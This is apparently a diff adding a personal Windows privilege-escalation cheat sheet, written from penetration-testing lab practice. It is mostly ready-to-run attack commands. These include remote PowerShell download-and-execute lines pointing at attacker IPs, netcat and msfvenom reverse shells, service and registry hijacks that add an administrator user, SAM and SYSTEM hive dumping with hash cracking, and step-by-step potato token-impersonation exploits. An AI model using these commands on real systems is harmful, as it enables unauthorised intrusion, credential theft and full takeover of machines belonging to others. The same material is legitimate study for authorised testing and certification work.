@@ -1,0 +1,982 @@
+{{{ ###Order Of Operations With Tools
+
+whoami && whoami /groups && whoami /priv
+net user <username> & net localgroup administrators
+systeminfo
+	wmic os get osarchitecture && wmic os get Caption
+Dir Desktop, C, Program files, Program filesx86
+WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+cmdkey /list
+netstat -napo tcp
+tasklist /v
+set
+wmic service where started=true get name,startname
+#Strings on custom binaries
+
+
+Tools
+	powerup.ps1
+		powershell.exe -exec Bypass "IEX(New-Object Net.WebClient).DownloadString('http://10.9.0.59/PowerUp.ps1'); Invoke-ALLCHECKS" 
+		sharpup.exe (if you can't run powerup)
+		sherlock.ps1 (if the machine is Win7 or older)
+	winPEASany.exe
+		.\winPEASany.exe quiet cmd fast 			(Fast check for lots 'o' shit)
+		
+		.\winPEASany.exe quiet servicesinfo		(Check for Services) 
+		.\winPEASany.exe quiet applicationsinfo	(Check for AutoRun executables)
+		.\winPEASany.exe quiet procesinfo			(Check for non-standard processes (I know it is spelt wrong))
+		.\winPEASany.exe quiet windowscreds	(Search for Creds)
+		.\winPEASany.exe quiet filesinfo userinfo	(More cred searching)
+		.\winPEASany.exe quiet cmd systeminfo	(replaces watson and wes.py as far as I can tell)
+
+		.\winPEASany.bat (if .net4 or greater is not on the target)
+	jaws.ps1 (payload all the things)
+	SharpHound.ps1  <if it is a dc especially
+	wes.py
+		pushd /Yeet/Skeet/wesng/ && ./wes.py /Yeet/Machines/UPE/Tiberius_Windows/Systeminfo.txt -i "Remote Code Execution" && popd
+	accesschk.exe (Not a PE tool, but still handy)
+		Service
+			.\accesschk.exe /accepteula -uwcqv myusername daclsvc
+		Directory	
+			.\accesschk.exe /accepteula -uwdq "C:\Program Files\"	(or icacls c:\)
+		File
+			.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"	(or icacls c:\file.exe)
+		Reg Key	
+			.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc		(or get-acl hklm\...| Format-List)
+
+	Re-Check for Services, registry, Service accounts, installed applications, admin processes (with versions), forwardable internal ports, weird processes, other usernames, non-standard scheduled tasks, and startup applications.
+
+}}} ###
+{{{ ###Manual Order of Operations
+O
+System Enumeration
+systeminfo
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+wmic logicaldisk get caption,description,providername
+
+User Enumeration
+whoami
+whoami /priv
+whoami /groups
+net user
+net user someguy
+net user administrator
+net localgroup
+net localgroup administrators
+
+Network Enumeration
+ipconfig /all
+arp -a
+route print
+netstat -ano
+
+AV and Firewall
+sc query windefend
+sc queryex type=service
+netsh advfirewall firewall dump
+netsh firewall show state
+netsh firewall show config
+
+Others
+PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+> tasklist /V
+> icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+C
+}}} ###
+{{{ ###Methods
+}}} ###
+#{{{ ###Kernels
+- ms10-015 kitrap0d | opens another shell, need metasploit
+- ms10-059 chimmichurri | MS10-059.exe 10.10.14.3 3232 (catch with nc)
+- ms15-051x64.exe "nc.exe 10.10.14.7 3232 -e cmd.exe"
+- Invoke-MS16032.ps1 (From powershell empire. Needs two CPU's.)
+	$ C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe C:\Users\kostas\Downloads\Invoke-MS16032.ps1 Invoke-MS16032 -Command IEX(New-Object Net.WebClient).downloadString('http://10.10.14.60:8000/Invoke-PowerShellTcp.ps1')
+	
+- ms17-010
+	[https://medium.com/@ranakhalil101/hack-the-box-blue-writeup-w-o-metasploit-572c6042feb8](https://medium.com/@ranakhalil101/hack-the-box-blue-writeup-w-o-metasploit-572c6042feb8)  
+	[https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/](https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/)
+
+	^^these only work if the guest account is active OR you have a username with creds. Otherwise, use metasploits exploit/windows/smb/ms17_010_psexec
+
+	if being used for privesc, to open port 445 to your kali
+    put plink.exe on target machine
+    plink -R 445:localhost:445 root@kaliip      to forward 445 traffic on the localhost to 445 on 10.11.0.186   
+    nmap -p 445 127.0.0.1 to verify 445 connectivity
+
+- CVE-2018-8120 .\x64.exe C:\RevShell.exe (catch with nc) (Will probably work against every windows 7 box)
+}}} ###
+#{{{ ### Services
+The common service misconfigurations are...
+1. Insecure Service Properties  
+2. Unquoted Service Path.  
+3. Weak Registry Permissions  
+4. Insecure Service Executables  
+5. DLL Hijacking
+
+- Note: In order to avoid the Rabbit Hole, Be sure you can start and stop the service (or that something is starting it periodically).
+}}} ###
+##{{{ ### Writeable BinPaths/Insecure Service Properties
+
+If you can write to the binpath of a service, you can change what it actually executes. (either an NC command, rev shell, or add a user to a group) 
+.\accesschk64.exe /accepteula -uwcqv MyUsername NameOfService    (This will find if you can write to any binpaths)
+	
+	sc qc NameOfService		(Current config)	
+	sc query NameOfService	(Status)
+	sc config daclsvc binpath= "net localgroup administrators MyUser /add" (You can also point this to a revshell executable)
+	sc start NameOfService
+
+}}} ###
+##{{{ ###Unquoted Service Paths
+
+Most tools will find these. If there are spaces in the name of a service executable windows will first search where there is a space plus .exe.
+example: C:\program files\service.exe  windows will first check for C:\program.exe.
+msfvenom -p windows/exec CMD='net localgroup administrators squid /add' -f exe-service -o program.exe
+	
+put program.exe at C:\program.exe
+sc start service
+
+}}} ###
+##{{{ ###Weak Registry Permissions
+
+The Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the 	service directly. This can be verified with either...
+
+PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
+---or---
+> .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\ServiceRegKey
+
+Overwrite the d-word and start the service
+
+reg query HKLM\SYSTEM\CurrentControlSet\services\ServiceRegKey
+reg add HKLM\SYSTEM\CurrentControlSet\services\ServiceRegKey /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+sc start ServiceReg 
+
+}}} ###
+##{{{ ###Insecure Service Executable Files (Overwrite the .exe)
+
+.\accesschk64.exe -quvw /accepteula "C:\Program Files\File Permissions Service" (PowerUp is more likely to find this for you.)  
+if the "Everyone user group has "FILE_ALL_ACCESS" permission on a file for a service that is executed as an admin we can overwrite it with our own service executable (and hopefully start the service).  
+windows_service.c is kept in the compiled binaries github  
+Edit the line to change the commands you are going to run (probably add a user to the administrators group or run NC for a rev shell).  
+example: cmd.exe /k net localgroup administrators squid /add  
+compile it with x86_64-w64-mingw32-gcc windows_service.c -o x.exe (apt install gcc-mingw-w64)  
+put x.exe on the target  
+  
+Backup the original file.  
+copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"  
+sc start filepermsvc  
+  
+---Note---Regular executables are sometimes fine. I am unsure as to what the delineation is.
+
+}}} ###
+##{{{ ###DLL Hijacking
+
+Can be found via procmon. More than likely, this will be found with a tool if at all.  
+A DLL Hijack occurs when an executable tries to load a dll that is not there.  
+You will need to be able to write to that location and probably start the service.  
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.9.0.59 -f dll -a x64 -o hijackme.dll (arch is super important for dll's)  
+or windows_dll.c is kept in the compiled binaries github  
+Edit the line to change the commands you are going to run (probably add a user to the administrators group or run NC for a rev shell).  
+example: cmd.exe /k net localgroup administrators squid /add  
+compile it with line from top of code (x86 or x64 is super important) (apt install gcc-mingw-w64)  
+put x.exe on the target  
+sc stop dllsvc  
+sc start dllsvc
+
+}}} ###
+#{{{ ###Registry
+The common registry misconfigurations are...
+1. Autoruns
+2. AlwaysInstallElevated
+}}} ###
+##{{{ ###AutoRunKeys
+
+If one of these are writeable, most tools will find it. If you wanted to do it manually...
+	reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run and then .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+Then overwrite the executable with your own.
+	copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
+
+
+Below is a long ass list of AutoRun Keys. Most of them run at startup or login. If you can add/change the value of a key, you may be able to privesc. -Note-Many keys respond to weird variables. For example the Run key runs as the user whom was last logged in (weird right?).
+
+::
+:: These registry key locations were copied directly from the Everything tab in SysInternals' Autoruns
+::==================================================================================================
+::
+:: Windows Kernel 5 (2k/xp)
+::
+
+\HKCU\Software\Policies\Microsoft\Windows\System\Scripts\Logoff
+\HKCU\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup
+\HKCU\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Shutdown
+\HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\Shell
+\HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
+\HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load
+\HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run
+\HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
+\HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+\HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+\HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce
+\HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx
+\HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
+\HKCU\SOFTWARE\Classes\Protocols\Filter
+\HKCU\SOFTWARE\Classes\Protocols\Handler
+\HKCU\SOFTWARE\Microsoft\Internet Explorer\Desktop\Components
+\HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components
+\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
+\HKCU\Software\Classes\*\ShellEx\ContextMenuHandlers
+\HKCU\Software\Classes\AllFileSystemObjects\ShellEx\ContextMenuHandlers
+\HKCU\Software\Classes\Directory\ShellEx\ContextMenuHandlers
+\HKCU\Software\Classes\Directory\Shellex\DragDropHandlers
+\HKCU\Software\Classes\Directory\Shellex\PropertySheetHandlers
+\HKCU\Software\Classes\Directory\Shellex\CopyHookHandlers
+\HKCU\Software\Classes\Folder\Shellex\ColumnHandlers
+\HKCU\Software\Classes\Folder\ShellEx\ContextMenuHandlers
+\HKCU\Software\Classes\Directory\Background\ShellEx\ContextMenuHandlers
+\HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers
+\HKCU\Software\Microsoft\Ctf\LangBarAddin
+\HKCU\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved
+\HKCU\Software\Microsoft\Internet Explorer\UrlSearchHooks
+\HKCU\Software\Microsoft\Internet Explorer\Explorer Bars
+\HKCU\Software\Microsoft\Internet Explorer\Extensions
+\HKCU\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+\HKCU\Software\Classes\Filter
+\HKCU\Software\Microsoft\Command Processor\Autorun
+\HKCU\SOFTWARE\Classes\Exefile\Shell\Open\Command\(Default)
+\HKCU\Software\Classes\.exe
+\HKCU\Software\Classes\.cmd
+\HKCU\SOFTWARE\Policies\Microsoft\Windows\Control Panel\Desktop\Scrnsave.exe
+\HKCU\Control Panel\Desktop\Scrnsave.exe
+
+\HKLM\System\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\StartupPrograms
+\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AppSetup
+\HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Startup
+\HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Logon
+\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
+\HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Shutdown
+\HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Logoff
+\HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup
+\HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Shutdown
+\HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Shell
+\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
+\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Taskman
+\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce
+\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx
+\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
+\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx
+\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
+\HKLM\SOFTWARE\Classes\Protocols\Filter
+\HKLM\SOFTWARE\Classes\Protocols\Handler
+\HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components
+\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SharedTaskScheduler
+\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
+\HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellExecuteHooks
+\HKLM\Software\Classes\*\ShellEx\ContextMenuHandlers
+\HKLM\Software\Classes\AllFileSystemObjects\ShellEx\ContextMenuHandlers
+\HKLM\Software\Classes\Directory\ShellEx\ContextMenuHandlers
+\HKLM\Software\Classes\Directory\Shellex\DragDropHandlers
+\HKLM\Software\Classes\Directory\Shellex\PropertySheetHandlers
+\HKLM\Software\Classes\Directory\Shellex\CopyHookHandlers
+\HKLM\Software\Classes\Folder\Shellex\ColumnHandlers
+\HKLM\Software\Classes\Folder\ShellEx\ContextMenuHandlers
+\HKLM\Software\Classes\Directory\Background\ShellEx\ContextMenuHandlers
+\HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers
+\HKLM\Software\Microsoft\Ctf\LangBarAddin
+\HKLM\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved
+\HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects
+\HKLM\Software\Microsoft\Internet Explorer\Toolbar
+\HKLM\Software\Microsoft\Internet Explorer\Explorer Bars
+\HKLM\Software\Microsoft\Internet Explorer\Extensions
+\HKLM\System\CurrentControlSet\Services
+\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+\HKLM\Software\Classes\Filter
+\HKLM\Software\Classes\CLSID\{083863F1-70DE-11d0-BD40-00A0C911CE86}\Instance
+\HKLM\Software\Classes\CLSID\{AC757296-3522-4E11-9862-C17BE5A1767E}\Instance
+\HKLM\Software\Classes\CLSID\{7ED96837-96F0-4812-B211-F13C24117ED3}\Instance
+\HKLM\Software\Classes\CLSID\{ABE3B9A4-257D-4B97-BD1A-294AF496222E}\Instance
+\HKLM\System\CurrentControlSet\Control\Session Manager\BootExecute
+\HKLM\System\CurrentControlSet\Control\Session Manager\SetupExecute
+\HKLM\System\CurrentControlSet\Control\Session Manager\Execute
+\HKLM\System\CurrentControlSet\Control\Session Manager\S0InitialCommand
+\HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
+\HKLM\Software\Microsoft\Command Processor\Autorun
+\HKLM\SOFTWARE\Classes\Exefile\Shell\Open\Command\(Default)
+\HKLM\Software\Classes\.exe
+\HKLM\Software\Classes\.cmd
+\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\Appinit_Dlls
+\HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\ServiceControllerStart
+\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LsaStart
+\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\System
+\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UIHost
+\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify
+\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GinaDLL
+\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Taskman
+\HKLM\System\CurrentControlSet\Control\BootVerificationProgram\ImagePath
+\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SaveDumpStart
+\HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries
+\HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries
+\HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors
+\HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SecurityProviders
+\HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages
+\HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages
+\HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
+\HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order
+::==================================================================================================
+::
+:: Windows Kernel 6 (vista/7/8x)
+::
+HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run	
+HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components
+HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components			
+HKLM\SOFTWARE\Classes\Protocols\Filter			
+HKLM\Software\Classes\*\ShellEx\ContextMenuHandlers			
+HKLM\Software\Wow6432Node\Classes\*\ShellEx\ContextMenuHandlers			
+HKLM\Software\Classes\Directory\ShellEx\ContextMenuHandlers
+HKLM\Software\Wow6432Node\Classes\Directory\ShellEx\ContextMenuHandlers			
+HKLM\Software\Classes\Directory\Shellex\DragDropHandlers
+HKLM\Software\Classes\Directory\Shellex\CopyHookHandlers	
+HKLM\Software\Wow6432Node\Classes\Directory\Shellex\CopyHookHandlers			
+HKLM\Software\Classes\Directory\Background\ShellEx\ContextMenuHandlers			
+HKLM\Software\Wow6432Node\Classes\Directory\Background\ShellEx\ContextMenuHandlers			
+HKLM\Software\Wow6432Node\Classes\Folder\Shellex\ColumnHandlers			
+HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects			
+HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects			
+Task Scheduler			
+HKLM\System\CurrentControlSet\Services			
+HKLM\System\CurrentControlSet\Services	
+HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32			
+HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32			
+HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries			
+HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries64	
+
+}}} ###
+
+
+
+
+
+
+
+
+
+
+
+
+
+##{{{ ###AlwaysInstallElevated
+
+MSI files are package files used to install applications. These files run with the permissions of the user trying to install them. Windows allows for these installers to be run with elevated (i.e. admin) privileges. If this is the case, we can generate a malicious MSI file that contains a reverse shell. Two keys must be set to "1" for this to work.
+HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+---AND---
+HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi
+> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+
+}}} ###
+#{{{ ###Passwords
+}}} ###
+##{{{ ###Manual Password Hunting
+
+Password Hunting
+> dir /s *pass* == *.config
+> findstr /si password *.txt *.ini *.config *.xml    
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords
+https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
+type C:\Windows\Panther\Unattend.xml (base64 between <value> tags.
+
+> reg query HKLM /f password /t REG_SZ /s
+> reg query HKCU /f password /t REG_SZ /s
+
+> cmdkey /list			(see runas)
+> type C:\Windows\Panther\Unattend.xml
+
+Base64 decode on kali
+# echo "cGFzc3dvcmQxMjM=" | base64 -d
+
+}}} ###
+##{{{ ###SAM and SYSTEM
+
+The SAM file is where Windows stores password hashes. The SAM is a database file. The hash key can be found in the SYSTEM file. The SAM and SYSTEM files are located in the C:\Windows\System32\config directory. The files are locked while Windows is running. Backups of the files may exist in the C:\Windows\Repair or C:\Windows\System32\config\RegBack directories. You'll be able to dump passwords if you can read both files. 
+
+C:\> reg.exe save hklm\sam c:\temp\sam.save
+C:\> reg.exe save hklm\security c:\temp\security.save
+C:\> reg.exe save hklm\system c:\temp\system.save
+
+>move the files to the kali box
+
+secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+
+https://securusglobal.com/community/2013/12/20/dumping-windows-credentials/
+secretsdump.py megabank.local/administrator:'d0m@in4dminyeah!'@10.10.10.172
+
+c:\windows\system32\config
+    sam (user database)
+    system  registry hives (hklm) (system boot key)
+    ntds.dit if it is a dc
+    
+Tool for windows 10.
+	# git clone https://github.com/Neohapsis/creddump7.git
+	# python3 /usr/share/creddump7/pwdump.py SYSTEM SAM
+	# hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
+
+
+}}} ###
+#{{{ ###Scheduled Tasks
+
+Schtasks are normally run as the user who created it, but administrators can make tasks that run as other users or even system. I don't know of a good way to enumerate this. Paging through the non-microsoft ones might get you there.
+
+PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+> .\accesschk.exe /accepteula -quvw MyUsername C:\file.ps1
+
+If you can edit the file, overwrite it or append to it and win the war.
+
+}}} ###
+#{{{ ###Insecure GUI Apps
+
+> tasklist /V
+If a program runs as admin and you can use it, you may be able to privesc with it using something similar to the hhupd.exe method (mspaint is an easy example aswell).
+
+}}} ###
+#{{{ ###Startup Applications
+
+StartUp Applications
+	icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" (PowerUp will not find this)
+	if the BUILTIN\Users group has full access '(F)' to the directory, you will be able to put a file there (rev shell more than likley). When a user logs on (potentially an admin) you can spawn a shell as them.
+	msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe
+	
+There are directories that run everything inside of them at specified times (Mostly Logins). C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp directory will run everything inside of it at login as the user who logged in. Only .lnk files will be run (I've been told but experienced it be not true).
+	
+> .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+	
+VBScript to create a shortcut file
+	Set oWS = WScript.CreateObject("WScript.Shell")
+	sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+	Set oLink = oWS.CreateShortcut(sLinkFile)
+	oLink.TargetPath = "C:\PrivEsc\reverse.exe"
+	oLink.Save
+cscript CreateShortcut.vbs
+
+}}} ###
+
+#{{{ ###Installed Applications
+
+If you find a non-standard running process via a scan like "winPEASany.exe silent procesinfo, run the executable with /? or -h to get a look at what it might do. Also be sure to check if there is an entry for it on Exploit-DB.
+
+}}} ###
+#{{{ ###HotPotato
+
+The attack tricks Windows into authenticating as the SYSTEM user to a fake HTTP server using NTLM. The NTLM credentials then get relayed to SMB in order to gain command execution.
+
+.\potato.exe -ip 192.168.11.9 -cmd "C:\\users\\user\\desktop\\Shell.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
+
+https://github.com/foxglovesec/Potato
+https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html
+
+}}} ###
+#{{{ ###Token Impersonation
+
+If you have either of these tokens (whoami /groups) you may be able to use a potato exploit (most common in service accounts).
+	SeImpersonatePrivilege          > Rotten potato or Juicy potato
+	SeAssignPrimaryPrivilege        > Juicy potato
+	Newer Than Win10 1809		 > Rogue potato or PrintSpoofer.exe
+	SeBackupPrivilege					 > Read access to all files on the system (sam + system = PTH attack)
+	SeRestorePrivilege					 > Write access to all objects on the system (Modify both reg keys to allow AlwaysInstallElivated)
+	SeTakeOwnershipPrivilege		 > Lets you take ownership over all objects on the system. (WRITE_OWNER permission) Own an object, give yourself write access, do the thing (Modify both reg keys to allow AlwaysInstallElivated)
+	SeDebug								 > mimikatz/kiwi
+
+Tater: less chance of success but easier to use.
+	put Tater.ps1 on the target.
+	powershell.exe -nop -ep bypass -c import-module .\Tater.ps1; Invoke-Tater -Trigger 1 -Command "net localgroup administrators squid /add"
+
+https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html
+https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt
+
+}}} ###
+##{{{ ###Rotten Potato
+
+Try to avoid this. Juicy potato is less handsy and has a higher success rate.
+
+https://github.com/decoder-it/lonelypotato  has a compiled version of the exploit
+https://www.puckiestyle.nl/htb-bounty/        has a great rightup on the use of lonely potato (even though they call it rotten potato)
+
+1.
+make a file named rev.bat with the contents
+    powershell.exe -c "iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/Invoke-PowerShellTcp.ps1')"
+2.
+add a line to the bottom of Invoke-PowerShellTcp.ps1
+    Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.60 -port 3232
+3.
+pull lonely potato and rev.bat to the target
+    powershell.exe -exec Bypass "IEX (New-Object Net.WebClient).Downloadfile('http://10.10.14.60:8000/rev.bat', 'C:\users\kohsuke\appdata\local\temp\rev.bat')"
+4.
+start nc listener
+    nc -nlvp 3232
+5.
+execute the lonely potato exploit (renamed to rp.exe)
+    C:\users\kohsuke\appdata\local\temp\rp.exe * C:\users\kohsuke\appdata\local\temp\rev.bat
+6.
+    enjoy your system shell!
+
+}}} ###
+##{{{ ###Juicy Potato
+
+Juicy Potao: A little more handsy, but good success rate.
+	http://ohpe.it/juicy-potato/ < for best notes.
+	If you have the SeImpersonatePrivilege or the SeAssignPrimaryPrivilege token, find the operating system of the machine and compare it to the following site to get the CLSID.
+	https://ohpe.it/juicy-potato/CLSID/
+	upload nc and juicy potato
+	c:\users\public\jp.exe -l 1337 -p C:\windows\system32\cmd.exe -a "/c C:\users\public\nc.exe -e cmd.exe 10.10.14.3 3233" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
+	
+You can also start your own service shell.
+	.\PSExec64.exe -i -u "nt authority\local service" C:\users\user\Desktop\Shell.exe
+	JuicyPotato.exe -l 1337 -p C:\temp\shell32.exe -t * -c {F087771F-D74F-4C1A-BB8A-E16ACA9124EA}
+
+}}} ###
+##{{{ ###Rogue Potato
+
+Rogue Potato takes advantage of a similar vulnerability to Juicy Potato. To my knowledge, this will work on modern windows 10. Needs kali to run a redirector to forward the shell.
+	On Kali (.8 is the windows target)
+		sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.11.8:9999
+	On windows (.5 is the kali)
+		.\PSExec64.exe /accepteula -i -u "nt authority\local service" C:\Users\user\Desktop\Shell.exe
+		.\RoguePotato.exe -r 192.168.11.5 -l 9999 -e C:\temp\Shell32.exe -c "{F087771F-D74F-4C1A-BB8A-E16ACA9124EA}"
+
+
+}}} ###
+##{{{ ###Print Spoofer
+
+PrintSpoofer is another Token impersonation exploit that specifically takes advantage of the windows spooler service CLSID. (only works on windows 10)
+
+C:\temp\PSExec64.exe -accepteula -i -u "nt authority\local service" C:\temp\Shell.exe		(To simulate getting the service account)
+C:\temp\PrintSpoofer.exe –i -c "C:\temp\Shell.exe"
+.\printspoofer.exe -i -c C:\temp\Shell32.exe
+--NOTE-- I found that calling printspoofer with a full path does not seem to work...
+
+}}} ###
+##{{{ ###msf
+
+(not actually for tokens but super cool)
+	use exploit/multi/script/web_delivery		(This is for making a one liner to copy into the target box and execute. This also starts the payload handler)
+
+if post/multi/recon/local_exploit_suggester suggests ms16_075_reflection or reflection_juicy, we are about to do a potato attack.
+
+use exploit/windows/local/ms16_075_reflection_juicy
+run it to get your next shell
+go into the session
+load incognito
+list_tokens -u
+impersonate_token "NT Authority\system"
+shell
+(rooted)
+
+}}} ###
+##{{{ ###Details
+
+What are tokens?
+	Tokens are temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. (cookies for computers)
+
+Two types of tokens:
+	Delegate and Impersonate
+	A delegate token is created for logging into a machine or using Remote Desktop.
+	An impersonate token is "non-interactive" for use such as attaching a network drive or a domian logon script
+	
+View tokens with whoami /priv
+
+To see what you can do with those tokens check out these linksVV (SeImpersonate and SeAssignPrimaryToken are the biggies)
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges
+https://github.com/gtworek/Priv2Admin
+
+
+
+whoami /privs
